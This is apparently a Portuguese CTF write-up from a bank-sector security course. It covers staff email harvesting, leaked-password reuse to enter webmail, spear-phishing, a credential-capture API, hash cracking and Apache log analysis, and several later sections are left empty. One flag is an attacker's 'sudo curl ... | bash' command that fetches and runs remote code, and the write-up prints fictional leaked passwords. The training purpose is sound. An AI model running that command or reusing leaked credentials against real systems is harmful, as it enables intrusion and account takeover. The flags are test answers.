<img width="971" height="144" alt="image" src="https://github.com/user-attachments/assets/98273769-03a9-448d-af55-1c24d332e910" />  

> **Capture The Flag**  
> **Data:** 07/2026  
> **Categorias:** CSIRT, Phishing, Social Engeneering, Web Exploitation, Log Analysis, API Rest

---

## Sumário

1. [🔍 Introdução](#-introdução)
2. [🤝 Handshake!](#-handshake)
3. [🔐 Proteja suas senhas!](#-proteja-suas-senhas)
4. [🎣 Investigando o phishing](#-investigando-o-phishing)
5. [🪵 Logs de um servidor web](#-logs-de-um-servidor-web)
6. [🕹️ Comando e Controle (C2)](#️-comando-e-controle-c2)
7. [🚩 Conclusão](#-conclusão)

---

## 🔍 Introdução

* 1.1. [Write-Up](#write-up)
* 1.2. [Cenário](#cenário)
* 1.3. [Regras](#regras)
    * 1.3.1. [Desafios](#desafios)
    * 1.3.2. [Respostas incorretas](#respostas-incorretas)
    * 1.3.3. [Dicas](#dicas)

### Write-Up
Este documento reúne o write-up do Capture The Flag (CTF) de encerramento do curso Cyber Academy 2026, promovido pela Febraban em parceria com a GoHacking.
O objetivo desta documentação é registrar a metodologia e o raciocínio analítico empregados na resolução dos desafios. Mais do que apresentar apenas as respostas finais (flags), busquei detalhar todo o processo de investigação, os percalços encontrados pelo caminho e as estratégias utilizadas para superar cada obstáculo.

### Cenário
O grupo "*P3PP4 H4CK3R5*" tem divulgado arquivos contendo dados pessoais e credenciais de clientes e funcionários do Ficticious Bank (FB), tais vazamentos coincidem com alguns incidentes de segurança identificados pelo nosso CSIRT.

Após uma investigação inicial, foi possível identificar uma estação de trabalho de um dos colaboradores do banco se comunicando com um site suspeito (provável Central de Comando e Controle - C2 do grupo de hackers), além de algumas evidências de exfiltração de dados. Acreditamos que esse foi o vetor inicial do ataque.

O Ficticious Bank é uma fintech de pequeno porte em plena expansão. Um ataque desta magnitude causaria um sério impacto à reputação do banco e consequentemente perda de clientes. Em um esforço para tentar identificar as falhas exploradas pelos hackers e evitar a paralisação de suas atividades, sua equipe recebeu a tarefa de realizar um teste de segurança nos sistemas do banco com o intuito de identificar possíveis falhas, indícios de comprometimento e artefatos maliciosos instalados pelo grupo hacker. O Ficticious Bank conta com o empenho e dedicação da sua equipe para resolver este problema!

### Regras

#### Desafios
Quando o evento for iniciado pelo instrutor, os desafios estarão disponíveis. Para demonstrar a conclusão de cada tarefa você deve fornecer a informação solicitada (Flag) no enunciado do desafio. As flags são case sensitive e podem estar no formato `GoHacking{MinhaFlagCaseSensitive}`.

#### Respostas incorretas
A partir da 2ª resposta, você perderá 1 ponto para cada tentativa incorreta e será penalizado até 5 vezes (Máx 5 pts).

#### Dicas
Serão disponibilizadas dicas para cada desafio. As dicas podem ser requisitadas para auxiliar na resolução da atividade e não serão descontados pontos por isto; entretanto, o número de dicas solicitadas será o primeiro critério de desempate entre os participantes.

---

## 🤝 Handshake!
- 2.1. [SYN - Boas Vindas](#syn---boas-vindas---20-pts)
- 2.2. [SYN/ACK - Conexão com a rede do Ficticious Bank](#synack---conexão-com-a-rede-do-ficticious-bank---20pts)
---
### SYN - Boas Vindas - 20 pts
Olá! Seja bem-vindo! Esperamos que você nos ajude a encontrar as falhas que podem ter iniciado este ataque! Precisamos corrigi-las o quanto antes para restaurar nossos backups em segurança. Como sinal de boa fé, segue a sua primeira FLAG do Game: `GoHacking{BemVindoJovemPadawan}` Envie essa flag como resposta no campo abaixo.
#### 🚩 Flag
`Flag: GoHacking{BemVindoJovemPadawan}`

---
### SYN/ACK - Conexão com a rede do Ficticious Bank - 20 pts
Para validar a sua conexão com a rede do Ficticious Bank, siga as etapas a seguir: 
1 - Abra o seu navegador/browser; 
2 - Acesse a página https://www.ficticiousbank.com 
3 - A flag de resposta desse desafio estará na página inicial e no título da página
#### 🧭 Exploração
Abrindo o link da Fictious Bank, nos deparamos com a Flag na página inicial:

![](Prints/Pasted%20image%2020260729014843.png)

#### 🚩 Flag
Este primeiro grupo de desafios foram só para apresentar o CTF. Estamos apenas começando!  

`Flag: GoHacking{ToNaRedeDoFicticiousBank}`

---

## 🔐 Proteja suas senhas!
- 3.1. [Identificando colaboradores](#identificando-colaboradores---50-pts)
- 3.2. [Mapeando E-mails](#mapeando-e-mails---50-pts)
- 3.3. [Padrão de e-mails](#padrão-de-e-mails---50-pts)
- 3.4. [Buscando credenciais de colaboradores](#buscando-credenciais-de-colaboradores---50-pts)
- 3.5. [Reutilização de senhas](#reutilização-de-senhas---50-pts)
---
### Identificando colaboradores - 50 pts
Navegue por todos os links do site do Ficticious Bank (https://www.ficticiousbank.com) e identifique os dados dos colaboradores que constam no site. Quantos colaboradores (chefes, executivos, especialistas) você identificou no total? Padrão de resposta: XX (Ex. 99)
#### 🧭 Exploração
Colei o link indicado na URL e naveguei por todos os links clicáveis no site, prestando atenção em qualquer menção à colaboradores.
Em um dos links encontrei:  

![](Prints/Pasted%20image%2020260729015402.png)

Pensei em já responder "7" como Flag, mas lembrei de ter visto alguns ícones de perfil na página inicial, então voltei para verificar:  

![](Prints/Pasted%20image%2020260729020202.png)
#### 🚩 Flag
Imediatamente pensei: "É realmente necessário manter todos esses e-mails de contato à mostra no site, para qualquer um ver?". Minha intuição se demonstrou correta,
como vamos ver a seguir.  

`Flag: 11`

---
### Mapeando E-mails - 50 pts
Qual é o e-mail da consultora Alessandra Melo?  
Padrão de resposta: xxxxxx@xxxxx.xxxxx
#### 🧭 Exploração
![](Prints/Pasted%20image%2020260729020432.png)

Abaixo do perfil de cada colaborador temos um ícone de cartão de negócios. Passar o mouse por cima revela um link para o e-mail de cada um.
#### 🚩 Flag
`Flag: alessandra.melo@ficticiousbank.com`

---
### Padrão de e-mails - 50 pts
Pelos e-mails identificados, qual seria o provável e-mail do CEO do Ficticious Bank?  
Padrão de resposta: xxxxxxx@xxxxx.xxxxx
#### 🧭 Exploração
Analisando os e-mails disponíveis na página, um padrão é faciilmente identificável. Todos os caloboradores possuem o e-mail que segue a estrutura:  
`primeiro_nome.segundo_nome@ficticiousbank.com`
#### 🚩 Flag
Além de qualquer visitante do site ter acesso aos e-mails corporativos da empresa, os e-mails não divulgados podem ser deduzidos, incluindo do próprio CEO José Fernandes. Essa prática abre brecha para que um atacante faça uso de táticas de phishing mais avançadas, como o Spear Phishing, como iremos ver mais adiante. 

`Flag: jose.fernandes@ficticiousbank.com`

---
### Buscando credenciais de colaboradores - 50 pts
Recentemente, o grupo “*P3PP4 H4CK3RS*” divulgou dados de centenas de usuários. O grupo alega possuir informações de mais de 1 milhão de pessoas; entretanto, a fonte não foi identificada. Nossa equipe de Threat Intelligence (Inteligência de Ameaças) conseguiu acesso ao arquivo de demonstração publicado pelos hackers e acredita que os dados possam pertencer a algum aplicativo de entretenimento. Link dos dados: https://pastebin.com/9rm2KeXd Senha de acesso: z2iTHAcrp2 Analise os dados publicados pelos hackers e identifique se algum colaborador do Ficticious Bank teve sua credencial vazada. A resposta deverá ser a senha do usuário, conforme consta nos dados expostos. Exemplo: MinhaSenhaExposta

**Target:** https://pastebin.com/9rm2KeXd
#### 🧭 Exploração
![](Prints/Pasted%20image%2020260729021013.png)

O banco de dados divulgado pelo grupo hacker possui mais de 33.000 (trinta e três mil) linhas de dados extremamente sensíveis de milhares de pessoas (desde nome completo, e-mail e senhas, até CPF e tipo sanguíneo).  
- Para procurar optei utilizar o comando de navegador _CTRL + F_ e pesquisar o nome e sobrenome de cada colaborador;
- Após não achar nada, pesquisei por _"@ficticiousbank.com"_, pois se o e-mail vazado fosse o corporativo que encontrei no site, encontraria qualquer colaborador rapidamente, mas não funcionou, indicando que o e-mail vazado se tratava de um pessoal;
- Pensei por um tempo e percebi um erro de premissa que cometi no início da busca: havia assumido como verdade que o sobrenome no perfil site seria exatamente o
segundo sobrenome do colaborador. Mas isso poderia simplesmente ser falso;
- Voltei ao primeiro passo e pesquisei apenas o primeiro nome de cada colaborador, onde eventualmente encontrei o perfil de Martín Paulo Dias.

![](Prints/Pasted%20image%2020260729022311.png)
#### 🚩 Flag
`Flag: kRzM36SU9e`

---
### Reutilização de senhas - 50 pts
Oh nãoooo… Aparentemente, um de nossos colaboradores teve sua credencial vazada pelo grupo “P3PP4 H4CK3RS”. Sempre orientamos o uso de senhas fortes e diferentes para acesso aos sistemas do banco, então, em teoria, ele não deveria reutilizar as mesmas credenciais no e-mail corporativo… Mas será que isso realmente aconteceu? Melhor conferir. Vai que essa conta também foi comprometida. Durante a análise da caixa de entrada do usuário, foi identificado um e-mail suspeito que chama atenção pelo assunto com tom de urgência, solicitando uma verificação imediata de segurança e alertando sobre possível suspensão da conta. Seu objetivo: Acessar a conta de e-mail do usuário e identificar qual é o endereço de e-mail do remetente da mensagem cujo assunto indica uma “Ação Urgente” relacionada à segurança da conta. A resposta deve ser enviada no seguinte formato: exemplo@dominio.com

**Target:** https://webmail.ficticiousbank.com
#### 🧭 Exploração
![](Prints/Pasted%20image%2020260729022835.png)

Já possuo o endereço de e-mail corporativo de Martín Dias, então tento ele em conjunto de sua senha vazada e consigo acesso.  
`martin.dias@ficticiousbank.com`  
`Flag: kRzM36SU9e`

![](Prints/Pasted%20image%2020260729023025.png)

Identifiquei a mensagem suspeita com o assunto indicado logo no topo da caixa de e-mail. 
#### 🚩 Flag
Mesmo que a senha de Matín (_kRzM36SU9e_) não seja fraca ou previsível, a sua força é minimizada quando ele repete esta mesma senha em vários serviços.
Como Martín e os outros colaboradores da Ficticious Bank poderiam melhorar suas senhas:
1. A senha atual de Martín utiliza letras maiúsculas, minúsculas e números. Isto já é bom, mas caracteres especiais (!@#$%) ou uma senha maior poderiam torná-la ótima;
2. Utilizar MFA (autentificação em múltiplos fatores);
3. O principal: não reutilizar a mesma senha. O ideal seria possuir um gerenciador de senhas seguro (evitando os gerenciadores presentes em navegadores) com uma única senha poderosa, enquanto outros serviços possuem senhas aleatórias ou outros meios de autenticação.

`Flag: seg.info@secure-auth-portal.com`

---

## 🎣 Investigando o phishing
- 4.1. [E-mail suspeito](#e-mail-suspeito---50-pts)
- 4.2. [Analisando e-mail com IA](#analisando-e-mail-com-ia---50-pts)
- 4.3. [Houston, temos um problema!](#houston-temos-um-problema---50-pts)
- 4.4. [Vamos à pescaria!](#vamos-à-pescaria---50-pts)
- 4.5. [Alterando parâmetros](#alterando-parâmetros---100-pts)
- 4.6. [Hashes](#hashes---50-pts)
- 4.7. [Quebrando hashes 1](#quebrando-hashes-1---50-pts)
- 4.8. [Quebrando hashes 2](#quebrando-hashes-2---50-pts)
- 4.9. [O lado negro da força...](#o-lado-negro-da-força---100-pts)

---
### E-mail suspeito - 50 pts
Sim, mesmo falando várias e várias vezes sobre os riscos de usar senhas repetidas.... a conta de um de nossos colaboradores foi comprometida! Agora precisamos constatar se esse acesso foi utilizado para alguma atividade maliciosa. Utilizando o acesso obtido nos desafios anteriores, verifique se há algum e-mail suspeito na caixa de entrada, você consegue identificar e-mails de phishing? A resposta é o assunto do e-mail.

**Target:** https://webmail.ficticiousbank.com
#### 🚩 Flag
O atacante utiliza a tática de criar sensção urgência para diminuir o senso crítico do alvo:
- "Ação Urgente"
- "imediatamente"
- "dentro de 24 horas"
- "suspensão da conta"

`Flag: Ação Urgente: Verificação de Segurança da Conta`

---
### Analisando e-mail com IA - 50 pts
Parece que temos algo suspeito na caixa de e-mails enviados... Aparentemente, alguém utilizou esse acesso para enviar uma comunicação para outros colaboradores da empresa. O link exibido no corpo do e-mail não corresponde ao destino real. Analise a mensagem e identifique para qual URL o link realmente aponta. A resposta deve ser informada sem o https:// e sem barra "/" no final.
#### 🧭 Exploração
Explorando a caixa de mensagens enviadas pelo e-mail de Martín encontramos a seguinte mensagem:

![](Prints/Pasted%20image%2020260729025809.png)

A URL aparente parece levar para um portal oficial do setor de RH do banco, mas analisando o link real encontramos algo mais suspeito:  
https://m2va8hds01.execute-api.us-east-1.amazonaws.com/
#### 🚩 Flag
É interessante notar como todo esta cadeia de ataque poderia ter sido quebrada e evitada se Martín apenas seguisse a política de senhas da organização ou as práticas que detalhei em [3.5. Reutilização de senhas](#reutilização-de-senhas---50-pts).  
Importante destacar que isso não faz de Martín "culpado" pelo incidente, mas precisamos entender onde houve a falha para evitar um evento futuro. Vamos nos aprofundar neste assunto em breve.

`Flag: m2va8hds01.execute-api.us-east-1.amazonaws.com`

---
### Houston, temos um problema! - 50 pts
A conta comprometida foi utilizada e os atacantes enviaram e-mails para outros colaboradores... Das opções abaixo, qual representa a técnica utilizada pelos atacantes para tentar comprometer credenciais de outros usuários?
#### 🚩 Flag
Como comentei em um desafio anterior, o ataque se utiliza de _Spear Phishing_. Esta técnica ofensiva consiste em uma versão mais avançada de Phishing, pois além de realizar spoofing e gatilhos emocionais, também personalizam a mensagem para aumentar mais ainda a chance de efetuar o roubo de dados. Isso tudo é facilitado pelas informações acessíveis por OSINT.

`Flag: Spear Phishing`

---
### Vamos à pescaria! - 50 pts
Vamos ver se é possível identificar quais colaboradores foram vítimas dessa campanha de phishing e tiveram suas credenciais vazadas. Acesse o link do e-mail malicioso e veja se encontra alguma informação útil no código da página de login. Para visualizar o código da página, no navegador, clique com o botão direito do mouse em alguma parte do site e selecione opções como: "Exibir código fonte da página" "Inspecionar" "Visualizar código" A flag estará em um comentário no código

**Target:** https://m2va8hds01.execute-api.us-east-1.amazonaws.com
#### 🧭 Exploração
O link redireciona para o site:

![](Prints/Pasted%20image%2020260729030348.png)

O site é apenas um formulário simples, com entradas para credenciais (usuário e senha), e possui a paleta de cor do personagem Papai Pig, do desenho Peppa Pig, sendo possivelmente uma indicação que o ataque foi especificamente realizado pelo hacker "_P4P41 P1G_", membro do _P3PPA H4CK3RS_.  
Inspecionando o site é possível notar a mensagem comentada entre o código HTML:
``` HTML
<!-- TODO: Precisamos melhorar a action de listar registros GoHacking{CaiuNaRedeÉPeixe} -->
```
#### 🚩 Flag
De início pode parecer difícil acreditar que alguém confiaria as credenciais a um site como este, mas é preciso levar em consideração que o e-mail com o link malicioso foi enviado diretamente pelo e-mail de Martín, um colaborador da empresa. Ou seja, uma fonte "confiável". Além de tocar em um assunto importante com tom de urgência, como analisamos em outras mensagens anteriores.

`Flag: GoHacking{CaiuNaRedeÉPeixe}`

---
### Alterando parâmetros - 100 pts
Aparentemente eles utilizaram um sistema bem simples para captura de credenciais. A aplicação possui apenas um endpoint e executa as ações de acordo com o parâmetro de URL action. Envie um nome de usuário e uma senha como teste e, em seguida, altere o parâmetro action da URL para verificar se conseguimos obter alguma informação interessante.
#### 🧭 Exploração
Inserindo credenciais para teste no formulário, a aplicação envia uma requisição com o parâmetro `action=registrar`.
<img width="1296" height="687" alt="image" src="https://github.com/user-attachments/assets/1ead83c3-b4eb-4c13-b1c7-1f2d84b99288" />  

Alterando a URL de `https://m2va8hds01.execute-api.us-east-1.amazonaws.com/?action=registrar` para `https://m2va8hds01.execute-api.us-east-1.amazonaws.com/?action=listar` obtemos a resposta da API em formato _JSON_:  
```
{
  "flag": "GoHacking{OParametroCertoAsVezesAjuda}",
  "captura1": {
    "usuario": "levi.farias",
    "hash": "7abf11935960fc499dbb5055fea98cb7"
  },
  "captura2": {
    "usuario": "carlos.mota",
    "hash": "c61024d89f8d48812dc6cde58cfc1ae4664f5fc44e5f7b95f2cdaab6baefeaad"
  }
}
```
#### 🚩 Flag
Essa lista revela que os colaboradores Levi Farias e Carlos Mota tiveram suas credenciais capturadas pelo site.

`Flag: GoHacking{OParametroCertoAsVezesAjuda}`

---
### Hashes - 50 pts
Analisando os hashes das credenciais capturadas pelos atacantes, quais das alternativas abaixo representam, respectivamente, os algoritmos de hash utilizados para armazenar as credenciais dos usuários levi.farias e carlos.mota?
#### 🧭 Exploração
Hashing é uma função matemática que transforma um dado em uma sequência alfanumérica irreversível que não possui chaves e nunca muda, geralmente utilizada em bancos de dados para evitar que senhas sejam salvas em texto claro.  
A análise do comprimento e formato das strings de hash revela:  
```
7abf11935960fc499dbb5055fea98cb7 (32 caracteres hexadecimais): Hash MD5 - Senha: chewbacca01  
c61024d89f8d48812dc6cde58cfc1ae4664f5fc44e5f7b95f2cdaab6baefeaad (64 caracteres hexadecimais): Hash SHA256 - Senha: 200898
```
#### 🚩 Flag
`Flag: MD5 | SHA256`

---
### Quebrando hashes 1 - 50 pts
Qual a senha do usuário levi.farias?
#### 🚩 Flag
`Flag: chewbacca01`

---
### Quebrando hashes 2 - 50 pts
Qual a senha do usuário carlos.mota?
#### 🚩 Flag
`Flag: 200898`

---
### O lado negro da força... - 100 pts
Uma das estratégias comuns dos Grupos Hackers atuais é o recrutamento de funcionários insatisfeitos, técnicas de persuasão e chantagem emocional. Na maioria das vezes eles oferecem quantias interessantes em criptomoedas para que o colaborador execute um comando, artefato malicioso ou forneça uma credencial privilegiada para acesso a rede interna da organização. Com as informações obtidas até agora, busque identificar indícios de que um de nossos padawans tenha sido recrutado pelo Lord Sith. A flag é o comando executado.
#### 🧭 Exploração
Agora que temos as credenciais de ambos podemos buscar por mensagens suspeitas em seus e-mails. Ao abrir a caixa de entrada de Levi Farias identifico a seguinte mensagem:  

![](Prints/Pasted%20image%2020260729032648.png)

Os atacantes utilizaram as credenciais obtidas durante o Spear Phishing para conseguir informações sigilosas do banco, abrindo brecha para chantagear Levi à executar o comando.
### 🚩 Flag
Este é um exemplo extremamente didático do porque não podemos encarar um incidente seguindo uma lógica de "punir o culpado pelo vazamento", quando este ocorre de maneira acidental/involuntária.  
Vamos analisar a situação: Levi, receioso de ser punido por acidentalmente permitir que atacantes adiquirissem supostas "informações privilegiadas", se viu vulnerável à uma chantagem e foi instrumentalizado como um vetor de ataque crucial.  
Observação: Nem sequer temos certeza de que os P3PP4 H4CK3RS realmente possuem as informações críticas que afirmam ter.  
Podemos concluir que um incidente grave pode ser evitável quando as lideranças e equipes de segurança se demonstram compreensivas em frente à um acidente. Não apenas isso deve ser uma política interna, como deve ser transparente para todos os colaboradores da organização.

`Flag: sudo curl 'https://gh4m3sz9t6.execute-api.us-east-1.amazonaws.com/default/install/MQ-2501' | bash`

---

## 🪵 Logs de um servidor web
- 5.1. [Entradas no Log](#entradas-no-log---50-pts)
- 5.2. [Primeiro Cliente](#primeiro-cliente---50-pts)
- 5.3. [Horário do Primeiro Acesso](#horário-do-primeiro-acesso---50-pts)
- 5.4. [Tamanho da Imagem](#tamanho-da-imagem---50-pts)
- 5.5. [Diferentes Clientes](#diferentes-clientes---100-pts)
- 5.6. [Campeão de Acesso](#campeão-de-acesso---100-pts)
- 5.7. [WHOIS 01](#whois-01---50-pts)
- 5.8. [WHOIS 02](#whois-02---50-pts)
- 5.9. [Scan Web](#scan-web---100-pts)
- 5.10. [Varredura](#varredura---100-pts)
- 5.11. [Atlantis](#atlantis---50-pts)
- 5.12. [Tipo de Atividade Ofensiva](#tipo-de-atividade-ofensiva---50-pts)
- 5.13. [Cyber Kill Chain](#cyber-kill-chain---50-pts)

---

### Entradas no Log - 50 pts
Nossa equipe do CSIRT está analisando os logs de um Servidor Web do Banco Ficticious com suspeita de ter sido atacado. O servidor está utilizando o serviço Apache e o respectivo arquivo de log é o "access.log" localizado no diretório "artefatos". Qual a quantidade de linhas (entradas) registradas no "access.log" ? Link de referência sobre o formato do arquivo de log: https://www.sumologic.com/blog/apache-access-log/  

**Target:** https://download.gohacking.com.br/febraban2026/access.log
#### 🧭 Exploração
O link leva para um arquivo com milhares de registros de logs de requisições.

![](Prints/Pasted%20image%2020260729155734.png)

Antes de continuar, acessei o link para referência para aprender sobre formatos de log. Isso me ajudou bastante a entender o que cada linha estava informando.

![](Prints/Pasted%20image%2020260729155917.png)

Tentei utilizar a ferramenta de busca do navegador (CRTL + F). A primeira vista, parecia que todas as requisições ao servidor se tratavam de GET, então pesquisei pelo termo "_GET_" para descobrir a quantidade de linhas.

![](Prints/Pasted%20image%2020260729161126.png)

Coloquei a flag 27767 e obtive "Resposta Incorreta" como resposta. Essa não foi uma boa estratégia porque nada havia provado que 100% das requisições seriam realmente "GET". Isso serviu para me fazer perceber que "chutar" respostas sem ponderação me faria perder pontos em algum momento, então voltei a tratar o CTF com seriedade para não cometer esse tipo de erro novamente.

Baixei os logs localmente com o comando `wget https://download.gohacking.com.br/febraban2026/access.log`, então utilizei a ferramenta de _word count_ com a opção de linhas:
```
$ wc -l access.log
```
```
27823 access.log
```
### 🚩 Flag
`Flag: 27823`

---
### Primeiro Cliente - 50 pts
Qual o endereço IP do primeiro acesso realizado ao servidor web ?
#### 🧭 Exploração
A data/hora exata do momento do acesso é carimbado no log e é o terceiro elemento. Como é organizado do log mais antigo ao mais recente, de cima para baixo, o primeiro acesso é o primeiro log no registro:  
`185.153.176.43 - - [07/Nov/2022:00:19:32 +0000] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"`
### 🚩 Flag
`Flag: 185.153.176.43`

---
### Horário do Primeiro Acesso - 50 pts
Qual é o horário (UTC) do primeiro acesso realizado ao servidor web, de acordo com o "access.log" ?
### 🚩 Flag
`Flag: 00:19:32`

---
### Tamanho da Imagem - 50 pts
Qual o tamanho (bytes) da imagem "openlogo-75.png" localizada no servidor web ?
#### 🧭 Exploração
Pesquisando a imagem com o comando grep, encontrei dois registros:
```
$ grep openlogo-75.png access.log
```
```
185.153.176.43 - - [07/Nov/2022:00:19:37 +0000] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://68.183.131.236/" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
179.48.248.22 - - [07/Nov/2022:00:23:36 +0000] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://68.183.131.236/" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
De acordo com a formatação comum de logs, o número que representa o tamanho do arquivo aparece em ambas as linhas como "6040".
### 🚩 Flag
`Flag: 6040`

---
### Diferentes Clientes - 100 pts
Quantos endereços IP distintos acessaram o servidor web ?

#### 🧭 Exploração
Contar os IPs um por um seria muito trabalhoso em um arquivo com quase 28 mil linhas. Refleti por um bom tempo, então tive a ideia de recortar apenas o IP de cada linha, excluir repetições, e então contar quantos IPs diferentes restam. Para isso busquei por ferramentas que poderiam me ajudar e duas foram essenciais:
   1. **cut** emite as partes selecionadas da linha de cada arquivo na saída;
      - **-d** informa um caractere específico que vai servir de delimitador entre as partes.
      - **-f1** faz com que apenas a primeira parte da mensagem (o IP) apareça na saída.
   2. **sort** escreve de forma ordenada a saída do arquivo;
      - **-u** elimina duplicatas de uma saída.
```
$ cut -d ' ' -f1 access.log | sort -u
```
```
179.48.248.22
185.153.176.43
189.1.168.183
5.253.115.36
81.22.36.42
```
Eu poderia utilizar também em conjunto a ferramenta **wc -l**, como já fiz em desafios anteriores, que me retornaria a quantidade de linhas exata. Porém eu queria a informção de _quais_ IPs acessaram o servidor, e não apenas _quantos_.

### 🚩 Flag
`Flag: 5`

---
### Campeão de Acesso - 100 pts
Qual foi o endereço IP que mais realizou acessos ao servidor web ?

#### 🧭 Exploração
Para descobrir a quantidade de linhas que cada IP aparecia, utilizei os comandos `grep` e `wc -l` para cada IP, então comparei as saídas e pude descobrir quem realizou mais acessos.
```
$ grep 179.48.248.22 access.log | wc -l
```
```
2190
```
```
$ grep 185.153.176.43 access.log | wc -l
```
```
154
```
```
$ grep 189.1.168.183 access.log | wc -l
```
```
33
```
```
$ grep 5.253.115.36 access.log | wc -l
```
```
2777
```
```
$ grep 81.22.36.42 access.log | wc -l
```
```
22669
```

Analisei os resultados, porém, por ser tarde da noite, não percebi imediatamente que o IP `81.22.36.42` possuia um dígito a mais que o IP `5.253.115.36`. O que resultou em uma tentativa errada. Analisei com mais calma, entendi o engano e tentei novamente.

### 🚩 Flag
As vezes a moral da história é: "esteja bem descansado, se quiser enfrentar o cibercrime!".

`Flag: 81.22.36.42`

---
### WHOIS 01 - 50 pts
Utilizando a base do WHOIS, qual é o e-mail de contato do abuse para o endereço IP que mais acessou o servidor web ?

#### 🧭 Exploração
Até este desafio não conhecia a ferramenta WHOIS. Acreditava se tratar de uma ferramenta de terminal assim como `grep`, `awk` ou `wc`, mas pesquisando descobri se tratar de um protocolo e banco de dados público e permite consultar endereços de IP e conseguir informações sobre seu ISP (provedor de internet). Acessei o site [registro.br](https://registro.br/tecnologia/ferramentas/whois/) para pesquisar o IP `81.22.36.42`.

![](Prints/Pasted%20image%2020260729202908.png)

### 🚩 Flag
`Flag: report@abuseradar.com`

---
### WHOIS 02 - 50 pts
Utilizando a base do WHOIS, a qual continente pertence o endereço IP que mais acessou o servidor web?

### 🚩 Flag
`Flag: Europa`

---
### Scan Web - 100 pts
Aparentemente, o endereço IP 185.153.176.43 utilizou uma ferramenta de scan de vulnerabilidade web. Qual é a versão da ferramenta ?  
Formato da resposta: 1.2.3

#### 🧭 Exploração
Antes de voltar para o terminal perguntei à Inteligência Artificial (Gemini) quais são as ferramentas de scan de vulnerabilidades mais comuns. 

![](Prints/Pasted%20image%2020260729204357.png)

Da lista conhecia apenas o `Burp Suite`, porém lembrei de ter lido a palavra `Nikto` em outro momento enquanto analisava os logs. Comecei a buscar pelo termo para garantir que não estava enganado.

```
$ grep 185.153.176.43 access.log | grep Nikto
```
O resultado é centenas de linhas com pequenas variações de:
```
81.22.36.42 - - [07/Nov/2022:00:30:48 +0000] "GET /gITn7HrJ.htaccess HTTP/1.1" 404 492 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)"
```
### 🚩 Flag
`Flag: 2.1.6`

---
### Varredura - 100 pts
O endereço IP 81.22.36.42 utilizou uma ferramenta de varredura de arquivos e diretórios web. Qual o nome (caixa baixa, somente letras) dessa ferramenta ?

#### 🧭 Exploração
Aqui temos que tomar cuidado, pois o primeiro instinto é responder 'nikto' por conta do último desafio. Porém Nikto é uma ferramenta de varredura de **vulnerabilidades web**, e não de **arquivos e diretórios**! Vamos precisar do seguinte comando:
```
$ grep 81.22.36.42 access.log | awk -F'"' '{print $6}' | sort -u
```
```
-
feroxbuster/2.7.1
Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:getinfo)
Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)
Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
sqlmap/1.6.10#stable (https://sqlmap.org)

```

Por que esse comando funciona?
- `grep`: Já vimos essa ferramenta diversas vezes até aqui, ela filtra linhas de um arquivo a partir de um termo. Neste caso, o IP;
- `awk`: É uma ótima ferramtenta para escanear e processar diversas linhas de um arquivo, precisamos dela para separar os logs em "células";
   - `-F`: Define um delimitador para o awk. Aqui o delimitador será a aspa dupla (");
   - `'{print $6}'`: Avisa ao awk que queremos apenas a sexta célula, no caso, o _user-agent_;
- `sort -u`: Outro velho conhecido, o sort organiza a saída dos comandos e o parâmetro obriga excluir linhas idênticas.

Dessa forma só nos é retornado o _user-agent_, a parte que informa qual navegador ou ferramenta o usuário está utilizando para acessar o servidor, e por isso temos resultados como "Mozilla". Como quero apenas a ferramenta de varredura de arquivos/diretórios, com uma pesquisa rápida, para garantir, descubro que `feroxbuster` se trata exatamente de uma dessas ferramentas.

### 🚩 Flag
`Flag: feroxbuster`

---
### Atlantis - 50 pts
Qual é o horário (UTC) da primeira tentativa de acesso à URI "/atlantis" ? 

#### 🧭 Exploração
Com um simples comando `grep` encontramos as linhas que precisamos para determinar o horário exato:

```
$ grep /atlantis access.log
```
```
5.253.115.36 - - [07/Nov/2022:00:25:35 +0000] "GET /atlantis HTTP/1.1" 404 437 "-" "feroxbuster/2.7.1"
81.22.36.42 - - [07/Nov/2022:00:28:42 +0000] "GET /atlantis HTTP/1.1" 404 437 "-" "feroxbuster/2.7.1"
```

### 🚩 Flag
`Flag: 00:25:35`

---
### Tipo de Atividade Ofensiva - 50 pts
#### 🧭 Exploração
### 🚩 Flag

### Cyber Kill Chain - 50 pts
#### 🧭 Exploração
### 🚩 Flag

---

## 🕹️ Comando e Controle (C2)
- 6.1. [Comando de Instalação](#comando-de-instalação---20-pts)
- 6.2. [O que o mestre mandar...](#o-que-o-mestre-mandar---50-pts)
- 6.3. [Mapeando a C2 inimiga](#mapeando-a-c2-inimiga---50-pts)
- 6.4. [Métodos HTTP](#métodos-http---100-pts)
- 6.5. [Servidores Comprometidos](#servidores-comprometidos---100-pts)

---

### Comando de Instalação - 20 pts
#### 🧭 Exploração
### 🚩 Flag


---
### O que o mestre mandar... - 50 pts
#### 🧭 Exploração
### 🚩 Flag


---
### Mapeando a C2 inimiga - 50 pts
#### 🧭 Exploração
### 🚩 Flag


---
### Métodos HTTP - 100 pts
#### 🧭 Exploração
### 🚩 Flag


---
### Servidores Comprometidos - 100 pts
#### 🧭 Exploração
### 🚩 Flag


---
## 🚩 Conclusão
